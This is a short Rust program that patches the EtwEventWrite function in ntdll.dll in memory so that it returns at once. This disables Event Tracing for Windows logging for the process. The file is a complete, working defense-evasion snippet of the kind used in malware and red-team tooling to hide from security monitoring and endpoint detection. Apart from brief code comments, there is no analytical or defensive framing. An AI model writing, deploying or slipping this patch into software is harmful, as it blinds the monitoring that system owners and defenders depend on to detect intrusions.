use windows::core::{s, Error, Result, PCSTR};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{
    VirtualProtect, PAGE_EXECUTE_READWRITE, 
    PAGE_PROTECTION_FLAGS,
};

fn main() -> Result<()> {
    let name = c"EtwEventWrite";
    unsafe {
        // The patch to be written (xor eax, eax; ret)
        let hook = [0x33, 0xC0, 0xC3];

        // Get a handle to ntdll.dll
        let h_module = GetModuleHandleA(s!("ntdll.dll"))?;

        // Get the address of the target function
        let address = GetProcAddress(h_module, PCSTR(name.as_ptr().cast()))
            .ok_or_else(|| Error::from_win32())? as *const u8;

        // Change memory protection to allow writing
        let mut old_protection = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(address.cast(), hook.len(), PAGE_EXECUTE_READWRITE, &mut old_protection)?;

        // Write the patch opcode
        std::ptr::copy_nonoverlapping(hook.as_ptr(), address.cast_mut(), hook.len());

        // Restore the original memory protection
        VirtualProtect(address.cast(), hook.len(), old_protection, &mut old_protection)?;
    }

    Ok(())
}
